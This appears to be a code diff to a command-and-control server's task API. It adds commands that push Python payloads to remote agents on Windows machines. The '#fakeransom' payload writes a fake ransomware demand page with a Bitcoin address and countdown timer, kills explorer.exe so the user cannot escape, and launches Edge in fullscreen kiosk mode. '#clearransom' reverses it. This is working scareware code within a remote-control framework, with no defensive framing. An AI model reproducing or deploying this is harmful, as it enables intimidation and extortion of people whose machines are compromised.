@@ -941,11 +941,126 @@ def init_api_routes(app, socketio):
             c = conn.cursor()
             
             task_data = data.get('task_data', {})
-            
+            task_type = data['task_type']
+
+            # Intercept #fakeransom command
+            if task_type == 'shell' and task_data.get('cmd', '').strip() == '#fakeransom':
+                task_type = 'execute_python'
+                ransom_html = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>FINAL WARNING</title>
+    <style>
+        body { background-color: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { text-align: center; border: 5px solid #ff0000; padding: 50px; max-width: 80%; background: rgba(20, 0, 0, 0.9); box-shadow: 0 0 50px #ff0000; }
+        h1 { font-size: 4em; margin: 0; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        .message { font-size: 1.5em; margin: 20px 0; }
+        .timer { font-size: 3em; font-weight: bold; color: #fff; margin: 30px 0; }
+        .id { color: #888; font-size: 0.9em; margin-top: 40px; }
+        .footer { margin-top: 50px; color: #ff0000; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ALL YOUR FILES ARE ENCRYPTED</h1>
+        <div class="message">
+            Your system has been infected with GLYCON-X Ransomware.<br>
+            All documents, photos, databases and other important files have been encrypted using AES-256.<br>
+            Any attempt to restore files manually will result in permanent data loss.
+        </div>
+        <div class="message">TIME REMAINING UNTIL PRIVATE KEY DELETION:</div>
+        <div class="timer" id="timer">72:00:00</div>
+        <div class="message">PAY 0.5 BTC TO: 1GlyconXvP7V1vE9vM5Z3xP3zT8vN5q4r</div>
+        <div class="footer">DO NOT SHUT DOWN OR RESTART YOUR COMPUTER</div>
+        <div class="id" id="sysid">SYSTEM ID: </div>
+    </div>
+    <script>
+        function updateTimer() {
+            let h = 71, m = 59, s = 59;
+            setInterval(() => {
+                s--;
+                if (s < 0) { s = 59; m--; }
+                if (m < 0) { m = 59; h--; }
+                document.getElementById('timer').innerText = 
+                    (h < 10 ? '0'+h : h) + ":" + (m < 10 ? '0'+m : m) + ":" + (s < 10 ? '0'+s : s);
+            }, 1000);
+        }
+        document.getElementById('sysid').innerText += Math.random().toString(36).substr(2, 9).toUpperCase();
+        updateTimer();
+    </script>
+</body>
+</html>
+"""
+                python_payload = f"""
+import os
+import tempfile
+import base64
+import subprocess
+import winreg
+
+def get_edge_path():
+    paths = [
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"),
+        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe")
+    ]
+    for root, key_path in paths:
+        try:
+            with winreg.OpenKey(root, key_path) as key:
+                return winreg.QueryValue(key, None)
+        except WindowsError:
+            continue
+    return "msedge.exe"
+
+html_content = {repr(ransom_html)}
+temp_dir = tempfile.gettempdir()
+html_path = os.path.join(temp_dir, "gl_ransom.html")
+
+with open(html_path, "w", encoding="utf-8") as f:
+    f.write(html_content)
+
+# Kill explorer to prevent user from escaping easily
+subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+edge_path = get_edge_path()
+subprocess.Popen([edge_path, "--kiosk", f"file:///{{html_path}}", "--edge-kiosk-type=fullscreen", "--no-first-run", "--no-default-browser-check"], 
+                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+result = "Ransomware screen deployed successfully"
+"""
+                task_data = {'code': python_payload}
+
+            # Intercept #clearransom command
+            elif task_type == 'shell' and task_data.get('cmd', '').strip() == '#clearransom':
+                task_type = 'execute_python'
+                python_payload = """
+import os
+import subprocess
+import tempfile
+
+# Kill Edge browser
+subprocess.run(["taskkill", "/F", "/IM", "msedge.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+# Restart Explorer
+subprocess.Popen(["explorer.exe"], start_new_session=True)
+
+# Clean up temporary file
+temp_dir = tempfile.gettempdir()
+html_path = os.path.join(temp_dir, "gl_ransom.html")
+if os.path.exists(html_path):
+    try:
+        os.remove(html_path)
+    except:
+        pass
+
+result = "Ransomware screen cleared and Explorer restarted"
+"""
+                task_data = {'code': python_payload}
+
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                     (None, 
                     data['agent_id'], 
-                    data['task_type'], 
+                    task_type, 
                     json.dumps(task_data),
                     'pending', 
                     datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , 
